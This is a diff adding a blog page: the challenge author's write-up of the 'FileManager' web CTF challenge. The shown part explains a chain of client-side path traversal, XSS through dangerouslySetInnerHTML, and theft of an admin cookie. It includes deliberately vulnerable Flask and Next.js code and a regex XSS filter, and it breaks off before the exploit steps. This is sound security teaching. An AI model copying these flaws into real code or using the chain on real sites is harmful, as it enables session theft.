@@ -1,0 +1,678 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/blog/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=blog/livereload" data-no-instant defer></script>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Cybears ctf web/file manager - My Personal Blog</title><meta name="Description" content="This is my personal blog"><meta property="og:url" content="http://localhost:1313/blog/posts/cybears_ctf_web_file_manager/">
+  <meta property="og:site_name" content="My Personal Blog">
+  <meta property="og:title" content="Cybears ctf web/file manager">
+  <meta property="og:description" content="FileManager CTF Challenge Writeup Challenge: FileManager
+Event: Cybears CTF
+Category: Web
+Difficulty: Hard Source Code: https://github.com/F0DH1L/cybears_ctf_2k25/file_manager
+I created this challenge for Cybears CTF, a Capture The Flag competition focused on the Africa region. The event brought together many talented teams from across the continent, making it an exciting competition with high-quality participation.
+This was a web challenge that required chaining multiple vulnerabilities to steal the admin’s flag cookie.
+TL;DR This challenge chains three vulnerabilities to steal the flag:">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-12-27T18:57:17+01:00">
+    <meta property="article:modified_time" content="2025-12-27T18:57:17+01:00">
+    <meta property="article:tag" content="Ctf">
+    <meta property="article:tag" content="Web Security">
+    <meta property="article:tag" content="Cybears_ctf">
+    <meta property="article:tag" content="My_challenges">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Cybears ctf web/file manager">
+  <meta name="twitter:description" content="FileManager CTF Challenge Writeup Challenge: FileManager
+Event: Cybears CTF
+Category: Web
+Difficulty: Hard Source Code: https://github.com/F0DH1L/cybears_ctf_2k25/file_manager
+I created this challenge for Cybears CTF, a Capture The Flag competition focused on the Africa region. The event brought together many talented teams from across the continent, making it an exciting competition with high-quality participation.
+This was a web challenge that required chaining multiple vulnerabilities to steal the admin’s flag cookie.
+TL;DR This challenge chains three vulnerabilities to steal the flag:">
+<meta name="application-name" content="My Personal Blog">
+<meta name="apple-mobile-web-app-title" content="My Personal Blog">
+<meta name="referrer" content="no-referrer" /><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://localhost:1313/blog/posts/cybears_ctf_web_file_manager/" /><link rel="prev" href="http://localhost:1313/blog/posts/cybears_ctf_web_ozymandias/" /><link rel="stylesheet" href="/blog/css/style.min.css"><link rel="preload" href="/blog/lib/fontawesome-free/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/blog/lib/fontawesome-free/css/all.min.css"></noscript><link rel="preload" href="/blog/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/blog/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Cybears ctf web/file manager",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/localhost:1313\/blog\/posts\/cybears_ctf_web_file_manager\/"
+        },"genre": "posts","keywords": "ctf, web security, cybears_ctf, my_challenges","wordcount":  2477 ,
+        "url": "http:\/\/localhost:1313\/blog\/posts\/cybears_ctf_web_file_manager\/","datePublished": "2025-12-27T18:57:17+01:00","dateModified": "2025-12-27T18:57:17+01:00","license": "2025 F0DH1L","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "F0DH1L"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script>
+          const query = window.matchMedia('(prefers-color-scheme: dark)');
+          function applyTheme() {
+            let theme = window.localStorage?.getItem('theme') || 'dark';
+            let isDark = theme === 'dark' || (theme === 'auto' && query.matches);
+            document.body.setAttribute('theme', isDark? 'dark' : 'light');
+            document.body.setAttribute('cfg-theme', theme);
+          }
+
+          applyTheme();
+          query.addEventListener('change', applyTheme);
+        </script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/blog/" title="My Personal Blog">F0DH1L Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/blog/posts/"> Posts </a><a class="menu-item" href="/blog/tags/"> Tags </a><a class="menu-item" href="/blog/about/"> About </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/blog/" title="My Personal Blog">F0DH1L Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/blog/posts/" title="">Posts</a><a class="menu-item" href="/blog/tags/" title="">Tags</a><a class="menu-item" href="/blog/about/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Cybears ctf web/file manager</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/blog/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>F0DH1L</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2025-12-27">2025-12-27</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;2477 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;12 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#tldr">TL;DR</a></li>
+    <li><a href="#overview">Overview</a></li>
+    <li><a href="#application-architecture">Application Architecture</a>
+      <ul>
+        <li><a href="#flask-backend-port-5000">Flask Backend (Port 5000)</a></li>
+        <li><a href="#nextjs-frontend-port-3000">Next.js Frontend (Port 3000)</a></li>
+        <li><a href="#admin-bot">Admin Bot</a></li>
+      </ul>
+    </li>
+    <li><a href="#the-path-to-the-flag">The Path to the Flag</a>
+      <ul>
+        <li><a href="#discovery-1-the-xss-sink">Discovery #1: The XSS Sink</a></li>
+        <li><a href="#discovery-2-finding-urls-that-return-our-payload">Discovery #2: Finding URLs That Return Our Payload</a></li>
+        <li><a href="#discovery-3-client-side-path-traversal-cspt---making-the-bot-visit-unintended-urls">Discovery #3: Client-Side Path Traversal (CSPT) - Making the Bot Visit Unintended URLs</a></li>
+        <li><a href="#discovery-4-bypassing-the-waf-to-store-malicious-json">Discovery #4: Bypassing the WAF to Store Malicious JSON</a></li>
+      </ul>
+    </li>
+    <li><a href="#building-the-exploit">Building the Exploit</a>
+      <ul>
+        <li><a href="#step-1-create-a-file-with-malicious-json">Step 1: Create a File with Malicious JSON</a></li>
+        <li><a href="#step-2-report-the-file-url-to-the-bot">Step 2: Report the File URL to the Bot</a></li>
+        <li><a href="#step-3-the-full-exploit">Step 3: The Full Exploit</a></li>
+        <li><a href="#and-by-that-u-get-the-flag">And by that u get the flag</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="filemanager-ctf-challenge-writeup">FileManager CTF Challenge Writeup</h1>
+<p><strong>Challenge:</strong> FileManager<br>
+<strong>Event:</strong> Cybears CTF<br>
+<strong>Category:</strong> Web<br>
+<strong>Difficulty:</strong> Hard     <br>
+<strong>Source Code:</strong> <a href="https://github.com/F0DH1L/cybears_ctf_2k25/file_manager" target="_blank" rel="noopener noreffer ">https://github.com/F0DH1L/cybears_ctf_2k25/file_manager</a></p>
+<p>I created this challenge for Cybears CTF, a Capture The Flag competition focused on the Africa region. The event brought together many talented teams from across the continent, making it an exciting competition with high-quality participation.</p>
+<p>This was a web challenge that required chaining multiple vulnerabilities to steal the admin&rsquo;s flag cookie.</p>
+<hr>
+<h2 id="tldr">TL;DR</h2>
+<p>This challenge chains three vulnerabilities to steal the flag:</p>
+<ol>
+<li><strong>Client-Side Path Traversal (CSPT)</strong> - Double URL decoding forces the bot to visit unintended URLs containing XSS payloads</li>
+<li><strong>XSS via dangerouslySetInnerHTML</strong> - Next.js frontend renders API response messages without sanitization</li>
+<li><strong>Cookie Exfiltration</strong> - Admin bot has flag in cookie, XSS steals it</li>
+</ol>
+<hr>
+<h2 id="overview">Overview</h2>
+<p><strong>FileManager</strong> is a web application with two main components:</p>
+<ol>
+<li><strong>Flask Backend</strong> (Python, port 5000) - REST API with file management and authentication</li>
+<li><strong>Next.js Frontend</strong> (React/TypeScript, port 3000) - Client-side application</li>
+<li><strong>Admin Bot</strong> (Playwright) - Simulates admin user visiting reported URLs with flag cookie</li>
+</ol>
+<hr>
+<h2 id="application-architecture">Application Architecture</h2>
+<h3 id="flask-backend-port-5000">Flask Backend (Port 5000)</h3>
+<p>The backend provides several key endpoints across multiple blueprints:</p>
+<h4 id="authentication-routes-apiauth">Authentication Routes (<code>/api/auth/</code>)</h4>
+<ul>
+<li><code>POST /api/auth/register</code> - User registration</li>
+<li><code>POST /api/auth/login</code> - User authentication (creates session cookie)</li>
+<li><code>POST /api/auth/logout</code> - Clear user session</li>
+</ul>
+<h4 id="file-management-routes-api">File Management Routes (<code>/api/</code>)</h4>
+<ul>
+<li><code>POST /api/files</code> - Create a new file with WAF-protected content (returns filename ID and message)</li>
+<li><code>GET /api/files</code> - List all files belonging to authenticated user</li>
+<li><code>GET /api/files/details/&lt;filename&gt;</code> - Get file details (filename and content)
+<ul>
+<li>Admin can access any file</li>
+<li>Regular users only see their own files</li>
+</ul>
+</li>
+<li><code>GET /api/files/content/&lt;filename&gt;</code> - Get file content as parsed JSON (remember this will get back to it later)
+<ul>
+<li>Admin can access any file&rsquo;s content</li>
+<li>Regular users only see their own files</li>
+<li>Returns <code>{'message': 'File not found'}</code> if file doesn&rsquo;t exist</li>
+</ul>
+</li>
+<li><code>POST /api/files/&lt;filename&gt;</code> - Update visit counter for a file (returns message)</li>
+<li><code>DELETE /api/files/&lt;filename&gt;</code> - Delete a file (returns message)</li>
+</ul>
+<h4 id="admin-routes-api">Admin Routes (<code>/api/</code>)</h4>
+<ul>
+<li><code>POST /api/admin_debug?query=</code> - Debug endpoint that echoes query parameter
+<ul>
+<li>Requires authentication</li>
+<li>Returns <code>{'filename': ..., 'message': query_param}</code></li>
+<li><strong>Key vulnerability</strong>: Reflects query parameter directly in message field</li>
+</ul>
+</li>
+</ul>
+<h4 id="bot-trigger-api">Bot Trigger (<code>/api/</code>)</h4>
+<ul>
+<li><code>POST /api/report</code> - Trigger admin bot to visit a URL
+<ul>
+<li>Validates URL domain matches BASE_DOMAIN</li>
+<li>Bot visits with admin session and flag cookie</li>
+</ul>
+</li>
+</ul>
+<h4 id="the-key-backend-behavior">The Key Backend Behavior</h4>
+<p>Multiple endpoints return responses with a <code>message</code> field. Understanding which endpoints return messages is crucial for the exploit:</p>
+<p><strong>Endpoints that return a <code>message</code> field:</strong></p>
+<ul>
+<li><code>POST /api/files</code> - Returns <code>{'message': 'File created successfully', 'name': filename}</code></li>
+<li><code>POST /api/files/&lt;filename&gt;</code> - Returns <code>{'message': 'File visits updated successfully'}</code></li>
+<li><code>DELETE /api/files/&lt;filename&gt;</code> - Returns <code>{'message': 'File deleted successfully'}</code></li>
+<li><code>GET /api/files/content/&lt;filename&gt;</code> - Returns <code>{'message': 'File not found'}</code> on error</li>
+<li><code>POST /api/admin_debug?query=</code> - Returns <code>{'filename': ..., 'message': query_param}</code></li>
+</ul>
+<p>The <code>/api/admin_debug</code> endpoint is particularly interesting because it directly reflects the query parameter. In <code>backend/blueprints/admin.py</code>:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-python">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nd">@admin_bp.route</span><span class="p">(</span><span class="s1">&#39;/admin_debug&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_all_files</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">query_param</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;query&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="s1">&#39;user_id&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">session</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s1">&#39;message&#39;</span><span class="p">:</span> <span class="s1">&#39;Unauthorized&#39;</span><span class="p">}),</span> <span class="mi">401</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1"># if not session.get(&#39;admin&#39;):</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">#     return jsonify({&#39;message&#39;: &#39;Only Admin can do this&#39;}), 403</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="n">get_db_connection</span><span class="p">()</span> <span class="k">as</span> <span class="n">conn</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">cursor</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">cursor</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="n">cursor</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s2">&#34;SELECT filename FROM files WHERE content LIKE ?&#34;</span><span class="p">,</span> <span class="p">(</span><span class="sa">f</span><span class="s1">&#39;%</span><span class="si">{</span><span class="n">query_param</span><span class="si">}</span><span class="s1">%&#39;</span><span class="p">,))</span>
+</span></span><span class="line"><span class="cl">        <span class="n">file</span> <span class="o">=</span> <span class="n">cursor</span><span class="o">.</span><span class="n">fetchone</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">file</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s1">&#39;message&#39;</span><span class="p">:</span> <span class="s1">&#39;File not found&#39;</span><span class="p">}),</span> <span class="mi">404</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s1">&#39;filename&#39;</span><span class="p">:</span> <span class="n">file</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">],</span> <span class="s1">&#39;message&#39;</span><span class="p">:</span> <span class="n">query_param</span><span class="p">})</span></span></span></code></pre></div></div>
+<p>The endpoint returns a <code>message</code> field with the query parameter. This isn&rsquo;t inherently dangerous on the backend, but becomes exploitable when the frontend renders these messages unsafely.</p>
+<h4 id="the-waf-implementation">The WAF Implementation</h4>
+<p>File creation is protected by a WAF that filters XSS attempts:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-python">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">waf</span><span class="p">(</span><span class="nb">input</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;waf to filter for xss&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">input</span> <span class="o">=</span> <span class="n">unquote_plus</span><span class="p">(</span><span class="nb">input</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">input</span> <span class="o">=</span> <span class="nb">input</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">pattern</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="sa">r</span><span class="s1">&#39;(?:\b[a-zA-Z_]\w*[\s\/</span><span class="se">\\</span><span class="s1">]*\()|&#39;</span>  <span class="c1"># Function calls with parentheses</span>
+</span></span><span class="line"><span class="cl">        <span class="sa">r</span><span class="s1">&#39;(?:&lt;\s*[a-zA-Z]+(?:\s|&gt;))|&#39;</span>      <span class="c1"># HTML opening tags</span>
+</span></span><span class="line"><span class="cl">        <span class="sa">r</span><span class="s1">&#39;(?:&lt;[^&gt;]*\s[^&gt;]*&gt;)&#39;</span><span class="p">,</span>             <span class="c1"># HTML tags with attributes</span>
+</span></span><span class="line"><span class="cl">        <span class="n">re</span><span class="o">.</span><span class="n">I</span>
+</span></span><span class="line"><span class="cl">    <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">pattern</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="nb">input</span><span class="p">)</span></span></span></code></pre></div></div>
+<p>This WAF blocks common XSS patterns in file content, but it doesn&rsquo;t protect query parameters in URLs like those sent to <code>/api/admin_debug</code>.</p>
+<h4 id="interesting-finding-json-parsing-endpoint">Interesting Finding: JSON Parsing Endpoint</h4>
+<p>During code review, I noticed something interesting in the <code>/api/files/content/&lt;filename&gt;</code> endpoint:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-python">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nd">@file_bp.route</span><span class="p">(</span><span class="s1">&#39;/files/content/&lt;string:filename&gt;&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_file_content</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># ... authentication checks ...</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="n">get_db_connection</span><span class="p">()</span> <span class="k">as</span> <span class="n">conn</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">cursor</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">cursor</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="n">cursor</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s2">&#34;SELECT content FROM files WHERE filename = ?&#34;</span><span class="p">,</span> <span class="p">(</span><span class="n">filename</span><span class="p">,))</span>
+</span></span><span class="line"><span class="cl">        <span class="n">file</span> <span class="o">=</span> <span class="n">cursor</span><span class="o">.</span><span class="n">fetchone</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">file</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s1">&#39;message&#39;</span><span class="p">:</span> <span class="s1">&#39;File not found&#39;</span><span class="p">}),</span> <span class="mi">404</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">jsonify</span><span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">file</span><span class="p">[</span><span class="s1">&#39;content&#39;</span><span class="p">]))</span>  <span class="c1"># Loads JSON and returns it</span></span></span></code></pre></div></div>
+<p>Unlike other endpoints that return the content as a string, this endpoint <strong>parses the stored content as JSON</strong> and returns the parsed object. This means:</p>
+<ul>
+<li>If we store valid JSON in a file, the endpoint will parse it</li>
+<li>The response structure depends on what JSON we stored</li>
+<li>We could potentially store <code>{&quot;message&quot;: &quot;our content&quot;}</code> and it would be returned as-is</li>
+</ul>
+<p>This behavior becomes relevant later when we explore the full exploit chain. Keep this in mind!</p>
+<h3 id="nextjs-frontend-port-3000">Next.js Frontend (Port 3000)</h3>
+<p>The frontend has a critical XSS vulnerability in <code>/app/files/[id]/page.tsx</code>. Looking at the compiled JavaScript from the production build (<code>build/_next/static/chunks/28348a5861dc924c.js</code>):</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-javascript">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">n</span><span class="p">({</span><span class="nx">params</span><span class="o">:</span> <span class="nx">e</span><span class="p">})</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="p">[</span><span class="nx">n</span><span class="p">,</span> <span class="nx">r</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">i</span><span class="p">.</span><span class="nx">useState</span><span class="p">)(</span><span class="s2">&#34;&#34;</span><span class="p">),</span> <span class="nx">l</span> <span class="o">=</span> <span class="kr">async</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="kd">let</span> <span class="nx">t</span><span class="p">,</span> <span class="nx">i</span><span class="p">,</span> <span class="nx">n</span><span class="p">,</span> <span class="p">{</span><span class="nx">id</span><span class="o">:</span> <span class="nx">l</span><span class="p">}</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">e</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">a</span> <span class="o">=</span> <span class="nb">decodeURIComponent</span><span class="p">(</span><span class="nx">l</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">o</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">s</span><span class="p">.</span><span class="nx">fileService</span><span class="p">.</span><span class="nx">getFile</span><span class="p">(</span><span class="nx">a</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;object&#34;</span> <span class="o">!=</span> <span class="k">typeof</span> <span class="nx">o</span> <span class="o">?</span> <span class="p">(</span><span class="nx">t</span> <span class="o">=</span> <span class="p">(</span><span class="nx">n</span> <span class="o">=</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">o</span><span class="p">)).</span><span class="nx">content</span><span class="p">,</span> <span class="nx">i</span> <span class="o">=</span> <span class="nx">n</span><span class="p">.</span><span class="nx">filename</span><span class="p">)</span> <span class="o">:</span> <span class="p">(</span><span class="nx">t</span> <span class="o">=</span> <span class="nx">o</span><span class="p">.</span><span class="nx">content</span><span class="p">,</span> <span class="nx">i</span> <span class="o">=</span> <span class="nx">o</span><span class="p">.</span><span class="nx">filename</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="kd">let</span> <span class="nx">c</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">s</span><span class="p">.</span><span class="nx">fileService</span><span class="p">.</span><span class="nx">updateVisits</span><span class="p">(</span><span class="nx">i</span><span class="p">,</span> <span class="nx">t</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">r</span><span class="p">(</span><span class="nx">c</span><span class="p">.</span><span class="nx">message</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="s2">&#34;Failed to fetch files&#34;</span><span class="p">,</span> <span class="nx">e</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">};</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">i</span><span class="p">.</span><span class="nx">useEffect</span><span class="p">)(()</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">l</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}),</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">t</span><span class="p">.</span><span class="nx">jsxs</span><span class="p">)(</span><span class="s2">&#34;div&#34;</span><span class="p">,</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">className</span><span class="o">:</span> <span class="s2">&#34;container mx-auto p-4&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">children</span><span class="o">:</span> <span class="p">[(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">t</span><span class="p">.</span><span class="nx">jsx</span><span class="p">)(</span><span class="s2">&#34;h1&#34;</span><span class="p">,</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">className</span><span class="o">:</span> <span class="s2">&#34;text-2xl font-bold mb-4&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">children</span><span class="o">:</span> <span class="s2">&#34;File Manager&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}),</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">t</span><span class="p">.</span><span class="nx">jsx</span><span class="p">)(</span><span class="s2">&#34;h2&#34;</span><span class="p">,</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">children</span><span class="o">:</span> <span class="s2">&#34;Here is the filename&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}),</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">t</span><span class="p">.</span><span class="nx">jsx</span><span class="p">)(</span><span class="s2">&#34;br&#34;</span><span class="p">,</span> <span class="p">{}),</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">t</span><span class="p">.</span><span class="nx">jsx</span><span class="p">)(</span><span class="s2">&#34;div&#34;</span><span class="p">,</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">dangerouslySetInnerHTML</span><span class="o">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">__html</span><span class="o">:</span> <span class="nx">n</span>  <span class="c1">// The successMessage variable (minified as &#39;n&#39;)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}),</span> <span class="cm">/* ... more JSX ... */</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="p">})</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div>
+<p><strong>The vulnerability</strong>: The message from the API response is rendered using <code>dangerouslySetInnerHTML</code> without any sanitization! The variable <code>n</code> contains the message and gets directly rendered as HTML.</p>
+<h3 id="admin-bot">Admin Bot</h3>
+<p>From <code>backend/blueprints/report.py</code>:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-python">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
